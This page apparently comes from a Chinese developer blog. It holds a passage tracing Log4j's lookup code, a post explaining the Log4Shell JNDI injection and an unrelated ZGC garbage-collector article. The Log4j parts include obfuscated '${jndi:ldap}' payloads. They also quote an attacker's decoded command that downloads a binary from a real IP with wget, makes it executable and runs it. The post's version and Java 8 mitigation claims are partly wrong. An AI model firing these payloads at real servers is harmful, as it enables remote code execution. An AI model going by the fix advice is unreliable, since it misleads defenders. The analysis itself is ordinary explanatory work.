style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">d</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>&#123;::-r&#125;</span><span class="token variable"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo>:</mo><mo>:</mo><mo>−</mo><mi>m</mi></mrow><mo>&lt;</mo><mi mathvariant="normal">/</mi><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mo>&gt;</mo><mo>&lt;</mo><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>v</mi><mi>a</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">&quot;</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&#123;::-m&#125;&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mrel">:</span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">−</span><span class="mord mathnormal">m</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>&#123;::-i&#125;</span>😕/domain.com/j<span class="token punctuation">&#125;</span></p>
<p></code></pre></p>
 <p><img src="https://img-blog.csdnimg.cn/a4ab0f7f897f435087a5144dc17935ee.png" alt="在这里插入图片描述"></p> 
 <p><img src="https://img-blog.csdnimg.cn/64cfe705bd6a40d18d0336ccc52591a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 然后在匹配完后调用resolveVariable解析满足 Lookup 功能的语法 也就是这里调用的lookup去产生漏洞的</p> 
 <p>如支持的协议 即按照协议的语法去进行解析<br> date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j<br> 这里的作用是<br> 进行执行完lookup,然后将结果替换回原字符串后，再次调用 substitute 方法进行递归解析<br> <img src="https://img-blog.csdnimg.cn/30b0772e37464b88b25acec8ae0592ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt=""></p> 
 <p>⑥跟lookup方法：产生漏洞的核心原因<br> <img src="https://img-blog.csdnimg.cn/7ff0c11987524e7aac19d9871b600f49.png" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/5c39a355863243a886a58aaaa13953c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 然后接着跟<br> 发觉核心就两部分<br> ①判断前缀部分<br> ②调用执行部分即调用jndiManager.lookup解析请求,最终形成注入漏洞.<br> <img src="https://img-blog.csdnimg.cn/1e9a7a7d7e95488a9a95207bddd85106.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-27T09:20:47.000Z" title="2023/4/27 17:20:47">2023-04-27</time>发表</span><span class="level-item"><time dateTime="2023-04-27T09:22:53.841Z" title="2023/4/27 17:22:53">2023-04-27</time>更新</span><span class="level-item">9 分钟读完 (大约1386个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/27/%E3%80%90Log4J%E3%80%91%E5%85%B3%E4%BA%8E%E6%9C%80%E8%BF%91%E6%AF%94%E8%BE%83%E7%81%AB%E7%9A%84log4j%E7%A0%94%E7%A9%B6/">【Log4J】关于最近比较火的log4j研究</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h2 id="log4j关于最近比较火的log4j研究"><a class="markdownIt-Anchor" href="#log4j关于最近比较火的log4j研究">#</a> 【Log4J】关于最近比较火的 log4j 研究</h2>
<div id="content_views" class="htmledit_views"> 
 <p>最近log4j的安全漏洞搞得程序员人心慌慌，宣称为核弹级bug ，然后自己也找时间了解测试了一下。</p> 
 <p>Log4j是Apache的一个开源项目，通过使用Log4j，可以控制日志信息输送的目的地是控制台、文件等位置，是程序运行调试追溯问题发生位置的重要手段。</p> 
 <p><img alt="" height="439" src="https://img-blog.csdnimg.cn/5a64b8753efb4e28a7a8fe18cb3bec08.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;如上，我们自定义username模仿前端请求数据，通过LOGGER.info打印登录的用户名，我们就可以在控制台查看打印的信息。这样我们就可以记录登录的用户。</p> 
 <p>前端传入什么参数，就会在控制台打印出相应参数。</p> 
 <p><img alt="" height="449" src="https://img-blog.csdnimg.cn/5259bd29abeb4d89befcf32d075e3acf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p></p> 
 <p>但当我们传入一些特定参数的时候，打印结果就与期待结果有点不一样了,我们用${java:os}登录打印的却是本机系统信息。</p> 
 <p><img alt="" height="425" src="https://img-blog.csdnimg.cn/b1537c7396ac4ff6b3910a5c7b70aa17.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;为什么会产生这种奇怪的现象呢？</p> 
 <p>是因为log4j提供了一个lookup的功能，对lookup功能不熟悉的也没有关系，你知道有这么个方法，可以把一些系统变量放到日志中就可以了。是不是有点sql注入的味道了。</p> 
 <p>&nbsp;如果只是打印一些简单的系统信息到还没有什么安全隐患。</p> 
 <p><strong>但离谱的是 log4j 还提供了关于 jndi 的占位符。</strong></p> 
 <p><strong>jndi </strong>可以理解为http 地址，log4j会自动加载通过 jndi 从远程服务器获取的 java 对象。就是说黑客用一个特殊标记的jndi字符串登录你的服务器，然后在你打印日志的时候，通过log4j识别远程调用黑客指定服务器的java对象，相当于在你的代码中植入了一段黑客的代码，他可以在这个java对象中写入任何逻辑，比如说植入一个挖矿程序啊，甚至删除你服务器上的任何文件，你说恐怖不 。</p> 
 <p></p> 
 <p></p> 
 <p>下面我写了一个示例代码：</p> 
 <p>我的service程序仍然是模拟简单的用户登录打印日志。但是登录用户确是一段包含特殊字符的字符串。</p> 
 <p><img alt="" height="265" src="https://img-blog.csdnimg.cn/f9f816e0632b4d97824b7df2c66a85c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;运行起来发现被植入了一段特殊的字符。</p> 
 <p><img alt="" height="374" src="https://img-blog.csdnimg.cn/21c480314e2b41728f8553e1af0068a0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;这不是被人黑了吗。</p> 
 <p></p> 
 <p><strong>下面是我模拟的黑客自己搭建的攻击服务，可以选择性观看。</strong></p> 
 <p><img alt="" height="495" src="https://img-blog.csdnimg.cn/3573f5d9fc614c18a261ec5c36885981.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>127.0.0.1:80是我启动的一台nginx服务器，在其html文件下将编译好的EviObj的class文件放在了其下面。</p> 
 <p>EviObj类里面只有一个简答的打印代码。</p> 
 <p><img alt="" height="212" src="https://img-blog.csdnimg.cn/b1c2bafa599b4f3a9a191cc2b12d085e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="994"></p> 
 <p>&nbsp;然后就出现了之前的注入问题。</p> 
 <p>简单来说，就是log4j识别了字符串包中特殊的${jndi:rmi: }，log4j对其进行了远程调用，而黑客输入的地址正好是他部好侵入代码的地址，这样就在我们的代码中植入了黑客的代码。</p> 
 <p></p> 
 <p><strong>关于如何避免，我当然要看一下我们公司的程序会不会被攻击呀。</strong></p> 
 <p>如果你使用了 Java 8 或以上版本，基本对你没有什么危害。因为在 Java 8 中添加了一个新的属性 com.sun.jndi.rmi.object.trustURLCodebase，这是一个 boolean 类型。默认值是 false。</p> 
 <p>其实我刚才的代码也是隐藏了一部分，我把这个属性打开了才实验成功的。</p> 
 <p><img alt="" height="450" src="https://img-blog.csdnimg.cn/b272fe90a5e3426c904df05f236cab5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;而我们用的就是jdk8，所以第一个条件我们就规避成功避免了注入的条件。</p> 
 <p>其次log4j的版本是log4j 2.x&nbsp; -- log4j 2.4.0之间，如果处于这个版本区间需要升级到2.5.0版本方可。</p> 
 <p>而我们公司使用的版本是1.7.25版本 。</p> 
 <p><strong>然后最近我发现我们华为云上的一个项目确实被攻击了o(╥﹏╥)o，应该没有成功。</strong></p> 
 <p><strong>日志内容如下：</strong></p> 
 <p><img alt="" height="223" src="https://img-blog.csdnimg.cn/25e862aa81664787aaac24fa1a92e494.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;第一段</p> 
 <p>{${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}</p> 
 <p>${env:NaN:-j} 等于 j&nbsp;</p> 
 <p>${env:NaN:-:} 等于：</p> 
 <p>${env:NaN:-l} 等于 l</p> 
 <p>那解析完不就是${jndi:ldap: xxxx}，靠真是jndi注入</p> 
 <p>然后再看bease 64部分解析结果如下：</p> 
 <p><img alt="" height="402" src="https://img-blog.csdnimg.cn/dc6f2c7e99b44e7f856ea81f690f4797.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1175"></p> 
 <p>&nbsp;wget http://209.141.46.114/reader : 网站下载reader文件</p> 
 <p>chmod 777 reader ： 修改reader权限为 777</p> 
 <p>./reader runner ：运行reader文件</p> 
 <p>真是太阴险了，谁知道这reader是什么病毒啊 [○･｀Д´･ ○]</p> 
 <p>我还真去下载了一下这个reader，但现在下来发现是编译后文件又用upx加壳的文件，解壳后又要反编译，我没有反编译出来也就只能到此为止了。</p> 
 <p></p> 
</div>
## 关于我
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-27T09:20:46.000Z" title="2023/4/27 17:20:46">2023-04-27</time>发表</span><span class="level-item"><time dateTime="2023-04-27T09:23:11.367Z" title="2023/4/27 17:23:11">2023-04-27</time>更新</span><span class="level-item">1 小时读完 (大约13402个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/27/%E3%80%90JVM%E3%80%91%E6%9E%81%E8%87%B4%E4%BD%8E%E5%BB%B6%E8%BF%9F%E6%94%B6%E9%9B%86%E5%99%A8ZGC%E6%8E%A2%E7%B4%A2%E2%80%94%E2%80%94%E4%BA%9A%E6%AF%AB%E7%A7%92%E7%BA%A7%EF%BC%8C%E5%B8%B8%E6%95%B0%E7%BA%A7%E6%9A%82%E5%81%9CO(1)%E5%8E%9F%E7%90%86/">【JVM】极致低延迟收集器ZGC探索——亚毫秒级，常数级暂停O(1)原理</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h2 id="jvm极致低延迟收集器zgc探索亚毫秒级常数级暂停o1原理"><a class="markdownIt-Anchor" href="#jvm极致低延迟收集器zgc探索亚毫秒级常数级暂停o1原理">#</a> 【JVM】极致低延迟收集器 ZGC 探索 —— 亚毫秒级，常数级暂停 O (1) 原理</h2>
<div id="content_views" class="markdown_views prism-atom-one-dark"> 
 <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path> 
 </svg> 
 <p></p> 
 <div class="toc"> 
  <h3>文章目录</h3> 
  <ul>
   <li><a href="#ZGC__1">ZGC 收集器</a></li>
   <li>
    <ul>
     <li><a href="#ZGC_21">ZGC历程</a></li>
     <li><a href="#ZGC__53">ZGC 特性</a></li>
     <li>
      <ul>
       <li><a href="#_63">基于区块的内存模型</a></li>
      </ul> </li>
     <li><a href="#_80">完全并发原理</a></li>
     <li>
      <ul>
       <li><a href="#G1_82">G1的回收时停顿</a></li>
       <li><a href="#ZGC_100">ZGC的标记—复制算法</a></li>
       <li><a href="#ZGC_132">ZGC对象定位</a></li>
       <li>
        <ul>
         <li><a href="#_Color_Pointer_135">着色指针 `Color Pointer`</a></li>
         <li><a href="#_View_181">内存视图 `View`</a></li>
         <li><a href="#_Load_Barrier_202">读屏障 `Load Barrier`</a></li>
         <li><a href="#_Forwarding_Table_222">转移表 `Forwarding Table`</a></li>
         <li><a href="#_227">并发标记过程</a></li>
        </ul> </li>
       <li><a href="#_Stack_Watermark_Barrier_243">栈水印屏障 `Stack Watermark Barrier`</a></li>
      </ul> </li>
     <li><a href="#ZGC__275">ZGC 其他特性</a></li>
     <li>
      <ul>
       <li><a href="#_276">支持非统一内存访问架构</a></li>
       <li><a href="#_288">就地重定位</a></li>
      </ul> </li>
     <li><a href="#Azul_Zing_C4_GC_305">对比Azul Zing C4 GC</a></li>
     <li><a href="#_316">总结</a></li>
     <li>
      <ul>
       <li><a href="#ZGC__317">ZGC 优点</a></li>
       <li><a href="#ZGC__326">ZGC 缺点</a></li>
      </ul> </li>
     <li><a href="#ZGC_336">ZGC使用</a></li>
     <li>
      <ul>
       <li><a href="#_337">低版本可用</a></li>
       <li><a href="#ZGC_344">ZGC参数说明</a></li>
       <li><a href="#ZGC_366">ZGC的垃圾回收什么情况下会被触发？</a></li>
      </ul> </li>
     <li><a href="#ZGC_373">ZGC调优</a></li>
    </ul> </li>
   <li><a href="#_398">参考</a></li>
  </ul> 
 </div> 
 <p></p> 
 <h1><a id="ZGC__1"></a>ZGC 收集器</h1> 
 <p>ZGC收集器（Z Garbage Collector）是由Oracle公司为HotSpot JDK研发的，最新一代垃圾收集器。有说法使用这个名目标是取代之前的大部分垃圾收集器，所以才叫ZGC，表示极致的Extremely，或者最后的，垃圾收集器。类似 ZFS（文件系统），ZFS（文件系统）在它刚问世时在许多方面都是革命性的。</p> 
 <p><a target="_blank" rel="noopener" href="https://wiki.openjdk.org/display/zgc/Main">ZGC官网</a></p> 
 <blockquote> 
  <p>但是ZGC官方文档说<code>ZGC</code>这只是个名字，不代表任何含义。看你相信哪种了，笑</p> 
 </blockquote> 
 <ul>
  <li>设计目标<br> 希望能在尽可能对吞吐量影响不太大的前提下，实现在任意堆内存大小下都可以把垃圾收集的停顿时间限制在10ms以内的低延迟。 
   <ul>
    <li>停顿时间不超过10ms；</li>
    <li>停顿时间不会随着堆的大小，或者活跃对象的大小而增加；</li>
    <li>支持8MB~4TB级别的堆（未来支持16TB）。</li>
   </ul> </li>
 </ul> 
 <blockquote> 
  <p>主流的常见操作系统，比如Linux,Windows,MacOS,FreeBSD都是非实时操作系统。非实时操作系统的一个处理器时间片都在5~20毫秒，面向服务端的系统一个线程调度事件需要3-5个时间片，客户端系统则更多。10毫秒停顿已经可以认为是系统误差级的停顿，低于 Linux 内核的背景噪声，即调度开销和系统调用开销，此时ZGC基本已经成为无停顿GC。</p> 
 </blockquote> 
 <p>ZGC设计目标停顿时间在10ms以下，10ms其实是一个很保守的数据，在SPECjbb 2015基准测试中，128G的大堆下最大停顿时间才1.68ms，远低于10ms。<br> 而且ZGC目前的进展很快，在JDK17的测试中和shenandoah gc双双实现了亚毫秒(&lt;1ms)的GC暂停。<br> <a href="https://link.zhihu.com/?target=https://developers.redhat.com/articles/2021/09/16/shenandoah-openjdk-17-sub-millisecond-gc-pauses#">Shenandoah in OpenJDK 17: Sub-millisecond GC pauses | Red Hat Developer</a><br> 不负极致之名，Java17之后采用ZGC是最好的选择。</p> 
 <h2><a id="ZGC_21"></a>ZGC历程</h2> 
 <p>在Java11推出实验性的ZGC以来，历经数年开发，ZGC在当前已经新增了众多特性。<br> 一些关于ZGC特性、原理的文章已经稍有过时，比如ZGC只支持4TB大小的堆，ZGC不支持类卸载，ZGC只支持Linux/x64架构等。</p> 
 <p>不过通过这些文章对ZGC进行了解还是可行的。</p> 
 <p>ZGC各版本特性变化</p> 
 <ul>
  <li>JDK 12 
   <ul>
    <li>支持并发类卸载</li>
   </ul> </li>
  <li>JDK 13 
   <ul>
    <li>支持最大堆从4TB提升到16TB</li>
    <li>支持Linux/AArch64架构</li>
    <li>支持归还未使用内存</li>
   </ul> </li>
  <li>JDK 14 
   <ul>
    <li>支持MacOS/x64、Windows/x64架构</li>
    <li>支持最低8M的小堆</li>
   </ul> </li>
  <li>JDK 15 
   <ul>
    <li>生产就绪</li>
    <li>支持类数据共享（CDS）</li>
    <li>支持压缩类指针（对象头）</li>
    <li>支持渐进式归还内存</li>
   </ul> </li>
  <li>JDK 16 
   <ul>
    <li>新增并发线程栈扫描特性</li>
    <li>支持对象就地迁移</li>
    <li>支持Windows/aarch64架构</li>
   </ul> </li>
  <li>JDK 17 
   <ul>
    <li>新增动态GC线程数特性</li>
    <li>新增JVM快速退出特性</li>
    <li>支持macOS/aarch64架构</li>
   </ul> </li>
  <li>JDK 18 
   <ul>
    <li>支持字符串重复数据删除</li>
    <li>支持Linux/PowerPC架构</li>
   </ul> </li>
 </ul> 
 <h2><a id="ZGC__53"></a>ZGC 特性</h2> 
 <ul>
  <li>完全并发</li>
  <li>使用着色指针</li>
  <li>使用读屏障</li>
  <li>基于区块的内存模型</li>
  <li>支持就近分配的NUMA处理器架构</li>
  <li>压缩内存</li>
 </ul> 
 <p>其中完全并发的能力，是通过<strong>着色指针，读屏障，基于区块的内存模型</strong>来实现的，算是ZGC的<strong>基础特性</strong>。后面会首先研究。<br> 支持就近分配的NUMA处理器架构，压缩内存等是性能提升措施，会在完全并发之后介绍。</p> 
 <h3><a id="_63"></a>基于区块的内存模型</h3> 
 <p>类似于G1，ZGC也采用基于区块(<code>Region</code>)的堆内存布局，每个区块被称为<code>ZPage</code>。不同于G1的是，ZGC的区块具有动态性。ZGC的区块，支持动态创建和销毁，支持动态的区域容量大小变化。<br> ZGC区块分为以下几种</p> 
 <ul>
  <li> <p>小型区块（<code>Small Region</code>）：<br> 容量固定为2MB，用于放置小于256KB的小对象。</p> </li>
  <li> <p>中型区块（<code>Medium Region</code>）：<br> 容量固定为32MB，用于放置大于等于256KB但小于4MB的对象。</p> </li>
  <li> <p>大型区块（<code>Large Region</code>）：<br> 容量不固定，可以动态变化，但必须为2MB的整数倍，用于放置4MB或以上的大对象。每个大型Region中只会存放一个大对象，所以实际容量可能小于中型Region，最小容量可低至4MB。大型Region在ZGC的实现中是不会被重分配的，因为复制一个大对象的代价非常高昂。</p> </li>
 </ul> 
 <p><img src="https://img-blog.csdnimg.cn/img_convert/1eaac553ce4d82f137754de097cde9c0.png#pic_center" alt="ZPage"><br> 可以看到相比G1，ZGC的区块动态性不包括堆内存的每个区块可以根据运行情况的需要，扮演年轻代的Eden、Survivor区域、老年代区域、或者大对象(Humongous)区域。这是因为ZGC目前并不支持分代垃圾回收，没错，ZGC这个强大的收集器目前并不支持分代，据说是因为实现分代太复杂了，连Oracle团队也比较棘手。但不代表ZGC就不会用分代模型，已经有让ZGC支持分代回收的提案了<a target="_blank" rel="noopener" href="https://openjdk.org/jeps/439">JEP439</a>，就看未来什么时候能实现。</p> 
 <h2><a id="_80"></a>完全并发原理</h2> 
 <p>ZGC的最大特性就是做到了GC过程中的大部分阶段都能和用户线程并发，只有极少阶段（&lt;1ms）需要停顿，那么ZGC是如何做到的呢？</p> 
 <h3><a id="G1_82"></a>G1的回收时停顿</h3> 
 <p>G1和ZGC都基于标记-复制算法，但算法具体实现的不同就导致了巨大的性能差异。</p> 
 <p>以G1为例，通过G1中标记-复制算法过程（G1的Young GC和Mixed GC均采用该算法），分析G1的混合回收中停顿耗时的主要瓶颈。<br> <img src="https://img-blog.csdnimg.cn/b900e50509c24fd892f3b19b8ca29c64.png" alt="G1中标记-复制算法过程"><br> 已知G1混合回收采用了标记—复制的算法，混合回收(MixedGC)过程可以分为标记阶段、筛选回收阶段。其中筛选回收又分为清理阶段和复制阶段。</p> 
 <ul>
  <li>标记阶段停顿分析 耗时较短 
   <ul>
    <li>初始标记阶段：初始标记阶段是指从GC Roots出发标记全部直接子节点的过程，该阶段是STW的。由于GC Roots数量不多，通常该阶段耗时非常短。</li>
    <li>并发标记阶段：并发标记阶段是指从GC Roots开始对堆中对象进行可达性分析，找出存活对象。该阶段是并发的，即应用线程和GC线程可以同时活动。并发标记耗时相对长很多，但因为不是<em>程序停顿</em>，所以我们不太关心该阶段耗时的长短。</li>
    <li>再标记阶段：重新标记那些在并发标记阶段发生变化的对象。该阶段是STW的。</li>
   </ul> </li>
  <li>清理阶段停顿分析 耗时较短<br> 清理阶段识别出有存活对象的分区和没有存活对象的分区，该阶段不会清理垃圾对象，也不会执行存活对象的复制。该阶段是<em>程序停顿</em>的。</li>
  <li>复制阶段停顿分析 <strong>耗时较长</strong><br> 复制算法中的转移阶段需要分配新内存和复制对象的成员变量。转移阶段是<em>程序停顿</em>的，其中内存分配通常耗时非常短，但对象成员变量的复制耗时有可能较长，这是因为复制耗时与存活对象数量与对象复杂度成正比。对象越复杂，复制耗时越长。</li>
 </ul> 
 <p>四个STW过程中，初始标记因为只标记GC Roots，耗时较短。再标记因为对象数少，耗时也较短。清理阶段因为内存分区数量少，耗时也较短。 <strong>复制-转移阶段要处理所有存活的对象，耗时会较长。因此，G1停顿时间的瓶颈主要是标记-复制算法中的复制-转移阶段的<em>程序停顿</em></strong> 。为什么转移阶段不能和标记阶段一样并发执行呢？主要是G1未能解决转移过程中准确定位对象地址的问题。</p> 
 <h3><a id="ZGC_100"></a>ZGC的标记—复制算法</h3> 
 <p>与G1类似，ZGC也采用标记-复制算法，不过ZGC对该算法做了重大改进：ZGC在标记、转移和重定位阶段几乎都是并发的，这是ZGC实现停顿时间小于10ms目标的最关键原因。</p> 
